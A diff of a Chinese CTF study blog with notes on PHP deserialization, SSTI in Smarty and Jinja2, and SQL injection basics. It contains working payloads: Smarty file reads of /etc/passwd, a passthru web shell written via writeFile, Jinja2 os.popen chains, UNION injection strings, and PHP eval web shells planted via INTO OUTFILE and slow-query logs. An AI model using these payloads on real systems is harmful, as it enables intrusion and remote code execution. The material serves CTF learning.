+    <content><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p>
+<p>所以会碰到类，对象之类的概念</p>
+<p>稍微补充一点罢，不然会听不懂的()</p>
+<ul>
+<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
+<li><strong>对象</strong> − 是类的实例。</li>
+<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li>
+<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
+<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
+<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
+<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
+<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
+<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
+<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
+<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
+<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
+<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
+</ul>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>
+  <span class="comment">/* 成员变量 */</span>
+  <span class="keyword">var</span> <span class="variable">$url</span>;
+  <span class="keyword">var</span> <span class="variable">$title</span>;
+  
+  <span class="comment">/* 成员函数 */</span>
+  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
+     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
+  &#125;
+  
+  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
+     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
+  &#125;
+  
+  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
+     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
+  &#125;
+  
+  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
+     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
+  &#125;
+&#125;
+<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span>
+<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span>
+<span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>
+
+<span class="meta">?&gt;</span></code></pre>
+
+<h2 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h2><h3 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct() 和 __destruct()"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
+<pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre>
+
+<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
+<h3 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep() 和 __wakeup()"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
+<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
+<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
+<p>直接输入了字符串，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p>
+<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
+<ol>
+<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
+<li><strong>反序列化对象</strong>与字符串连接时</li>
+<li><strong>反序列化对象</strong>参与格式化字符串时</li>
+<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
+<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
+<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
+<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
+<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
+</ol>
+<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
+<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
+<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
+<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
+<h3 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get() 和 __set()"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong></p>
+<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
+<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
+<h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
+<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
+<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>绕过_wakeup:当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p>
+<p>&#x2F;&#x2F;详见[SWPUCTF 2021 新生赛]no_wakeup</p>
+]]></content>
+      <tags>
+        <tag>-web -CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -706,8 +792,118 @@ print(h)</code></pre>
 <p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
 <p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
 <p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
+<h2 id="确定攻击方式"><a href="#确定攻击方式" class="headerlink" title="确定攻击方式"></a>确定攻击方式</h2><h3 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h3><ul>
+<li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
+<li>在Mako模板引擎中我们也是${}形式的</li>
+</ul>
+<h3 id="第二层："><a href="#第二层：" class="headerlink" title="第二层："></a>第二层：</h3><ul>
+<li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li>
+<li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li>
+</ul>
+<h3 id="第三层："><a href="#第三层：" class="headerlink" title="第三层："></a>第三层：</h3><ul>
+<li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li>
+<li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li>
+</ul>
 <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php常见的模板：twig，smarty，blade</p>
-<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python常见的模板有：Jinja2，tornado</p>
+<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
+<p>基本确定指令</p>
+<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre>
+
+<p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p>
+<ul>
+<li><p>基于XFF的普通注入:在{}内疯狂输出</p>
+</li>
+<li><p>利用{include}来任意文件读取；string:{include file&#x3D;’D:\flag.txt’}这时文本内容就被读取了</p>
+</li>
+</ul>
+<h4 id="通过self获取Smarty类再调用其静态方法"><a href="#通过self获取Smarty类再调用其静态方法" class="headerlink" title="通过self获取Smarty类再调用其静态方法"></a><strong>通过self获取Smarty类再调用其静态方法</strong></h4><p><strong>getStreamVariable:</strong></p>
+<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span>
+<span class="function"></span>&#123;
+        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
+        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>
+        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
+            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
+                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
+            &#125;
+            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
+            <span class="keyword">return</span> <span class="variable">$_result</span>;
+        &#125;
+        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
+        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
+        &#125; <span class="keyword">else</span> &#123;
+            <span class="keyword">return</span> <span class="literal">null</span>;
+        &#125;
+    &#125;
+<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>
+smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流
+例如：
+&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>
+
+<p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> &#x2F;&#x2F;在v3.1.30退出历史舞台</p>
+<p><strong>writeFile：</strong></p>
+<p>这个不是很懂，直接引用这个大佬的博客吧</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
+<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
+        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
+        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
+        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
+        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
+            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
+        &#125;
+
+        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
+        <span class="comment">// if subdirs, create dir structure</span>
+        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
+            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
+        &#125;
+
+        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
+        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
+        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
+            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
+       &#125;</code></pre>
+
+<p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p>
+<p>我们注意看这段代码</p>
+<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
+            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
+       &#125;</code></pre>
+
+<p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p>
+<p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p>
+<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>
+
+<p>就有了</p>
+<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>
+
+<p>我们将<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>写入了临时php文件中</p>
+<p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p>
+<p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p>
+<p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p>
+<h4 id="标签"><a href="#标签" class="headerlink" title="标签:"></a>标签:</h4><p><strong>{$smarty.version}</strong></p>
+<p>获取smarty的版本信息</p>
+<p><strong>{literal}</strong></p>
+<p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p>
+<p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p>
+<p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p>
+<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>
+
+<p><strong>{php}{&#x2F;php}</strong></p>
+<p>用于执行php代码</p>
+<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>
+
+<p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p>
+<p><strong>{if}{&#x2F;if}</strong></p>
+<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
+&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
+<span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span></code></pre>
+
+<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python常见的模板有：Jinja2，tornado</p>
 <p>贴一下框架的判断方法</p>
 <pre><code class="highlight plaintext">&#123;7*7&#125; -&gt;49 -&gt; smarty
 
@@ -770,7 +966,9 @@ __base__　　 ：和上面的bases大概相同，都是返回当前类所继承
 __subclasses__　　：以列表返回类的子类
 __init__　　 ：类的初始化方法
 __globals__　　   ：对包含函数全局变量的字典的引用_
-_builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　
+_builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　
+这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　
+在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　
 1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　
 2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</code></pre>
 
@@ -976,6 +1174,15 @@ request.__class__.__mro__[1]
 #windows下的os命令
 &quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</code></pre>
 
+<p><strong>###</strong> <strong>总结一下其实思路有以下几种</strong></p>
+<p>1).通过文件读取的命令来注入，例如**&lt;class ‘_frozen_importlib_external.FileLoader’&gt;**这种</p>
+<p>2).利用os方法(拿到一个os开头的class就可以)来执行系统命令，达到cat flag的需求</p>
+<ul>
+<li><p>一般按基类开跑的是要拿builtins的方法</p>
+</li>
+<li><p>也可以使用config方法<strong>config.class.init[‘glo’+’bals’][‘os’].popen(‘ls’).read()</strong></p>
+</li>
+</ul>
 <p> <strong>一些绕waf的姿势：</strong></p>
 <p><strong>过滤[</strong></p>
 <pre><code class="highlight plaintext">#getitem、pop
@@ -1122,6 +1329,175 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>从零开始的SQL注入生活</title>
+    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
+    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
+<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
+<li><strong>创建</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
+<span class="keyword">create</span> <span class="keyword">table</span> table_name(
+column1 datatype,
+.......
+);#建立一个表
+</code></pre>
+
+
+
+<ul>
+<li><strong>查询</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
+<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
+<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
+<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
+#条件查询<span class="keyword">Where</span>
+(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
+(<span class="number">8</span>)<span class="keyword">NOT</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
+
+<ul>
+<li><strong>插入</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
+<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
+<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
+
+<ul>
+<li><strong>注马</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
+<span class="number">2.</span>利用日志文件写入木马
+<span class="number">1.</span>开启日志功能
+
+<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
+<span class="number">2.</span>设置日志存储路径
+
+<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
+<span class="number">3.</span>执行<span class="keyword">sql</span>语句
+
+<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
+</code></pre>
+
+
+
+<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><ul>
+<li>union注入(-1’)</li>
+</ul>
+<p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
+<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
+<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
+#查完后使用<span class="keyword">select</span> 语句
+<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
+#查库名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
+#查表名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
+#查列名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
+#直接查数据
